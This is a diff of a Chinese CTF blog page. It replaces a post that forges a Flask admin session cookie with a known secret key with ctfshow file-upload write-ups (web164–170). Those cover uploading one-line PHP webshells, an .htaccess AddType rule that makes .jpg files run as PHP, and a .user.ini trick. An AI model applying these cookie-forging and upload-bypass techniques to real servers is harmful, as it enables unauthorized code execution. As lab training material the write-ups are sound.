-<pre class="line-numbers language-session" data-language="session"><code class="language-session">python3 flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;b553f3a616e857b9c3c6bdbf6ef3e93358e439d1333b79f3253b4bf37cc96fceb63ccce24f1295d04ce6a3c916a0b50b559eadf19bc714138ae6a6be4462768d&#39;, &#39;csrf_token&#39;: b&#39;d2edd2f72d193760c045ccf60943ab1d647e0a2d&#39;, &#39;image&#39;: b&#39;02jS&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39; &#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gslekfwhyfj30fo06smye.jpg" alt="image-20210718210248514"></p>
+<ul>
+<li>有一个download.php,访问一下</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gslel4hj3gj30yp06u75c.jpg" alt="image-20210718210329333"></p>
+<ul>
+<li>根据提示知道需要一个<code>image</code>参数</li>
+</ul>
+<p><strong>那么就把刚才的图片马down下来</strong></p>
+<ul>
+<li>根据图片马的参数执行php语句</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gslf0cydekj30zk0lzjvu.jpg" alt="image-20210718211807716"></p>
+<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><ul>
+<li>上传zip文件，执行一句话</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gslm0s2f66j30zk0j5n0d.jpg" alt="image-20210719012044079"></p>
+<ul>
+<li><p>注意：由于<code>file=</code>所以不能用GET方式的一句话</p>
+</li>
+<li><p>蚁剑链接<code>http://8fa61473-c896-4e9d-aa5e-4226351a1583.challenge.ctf.show:8080/upload/download.php?file=38bb0ee5bf9ec83bea373b2fe6baacd9.zip</code></p>
+</li>
+</ul>
+<h2 id="Web167"><a href="#Web167" class="headerlink" title="Web167"></a>Web167</h2><ul>
+<li><p>查看响应包是apache的服务器</p>
+</li>
+<li><p>上传<code>.htaccess</code>文件，道理与<code>.user.ini</code>类似，只不过可以直接修改其他文件的解析形式</p>
+</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2usnrpj9j60yb02n3zk02.jpg" alt="image-20210601163815771"></p>
-<p>把它作为session，登陆<code>admin</code>,密码随便。。。</p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2uuffd8hj30fp09kwgd.jpg" alt="image-20210601163957560"></p>
-<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gr2utpigeqj30nm0763yy.jpg" alt="image-20210601163915968"></p>
+<ul>
+<li>上传一句话</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gslir55c4sj30zk0j5420.jpg" alt="image-20210718232734331"></p>
+<ul>
+<li>直接访问执行</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gslirkj4b7j31400lz0x0.jpg" alt="image-20210718232804748"></p>
+<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><ul>
+<li>同下</li>
+</ul>
+<h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><ul>
+<li>上传.zip文件，修改为.user.ini</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsll3lmewqj30zk0j5422.jpg" alt="image-20210719004850588"></p>
+<ul>
+<li>上传1.php，修改uA</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsll9wol8nj60zk0j5why02.jpg" alt="image-20210719005454253"></p>
+<ul>
+<li>访问/upload/1.php,执行命令</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsllbdn6ekj30sf0f878x.jpg" alt="image-20210719005618939"></p>
+<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><ul>
+<li>同上</li>
+</ul>
 
                 
             </div>
@@ -573,7 +772,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://echo-machile.github.io/2021/05/20/7798.html">http://echo-machile.github.io/2021/05/20/7798.html</a>
+                    <a href="http://echo-machile.github.io/2021/07/18/0.html">http://echo-machile.github.io/2021/07/18/0.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -610,11 +809,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/BUUCTF/">
-                                    <span class="chip bg-color">BUUCTF</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1066,62 +1261,18 @@ document.body.addEventListener('click', function(e) {
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/05/21/88.html">
+                <a href="/2021/07/18/0.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="shell笔记">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">shell笔记</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-21
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            尘落
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/linux-shell/">
-                        <span class="chip bg-color">linux shell</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/05/20/7777.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="BUUCTF-ACTF新生赛做题笔记">
-                        
-                        <span class="card-title">BUUCTF-ACTF新生赛做题笔记</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1132,7 +1283,45 @@ document.body.addEventListener('click', function(e) {
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-18
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            尘落
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/17/7009.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="ctfshow-php特性">
+                        
+                        <span class="card-title">ctfshow-php特性</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-17
                             </span>
                         <span class="publish-author">
                             
@@ -1145,8 +1334,8 @@ document.body.addEventListener('click', function(e) {
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/BUUCTF/">
-                        <span class="chip bg-color">BUUCTF</span>
+                    <a href="/tags/CTFSHOW/">
+                        <span class="chip bg-color">CTFSHOW</span>
                     </a>
                     
                 </div>
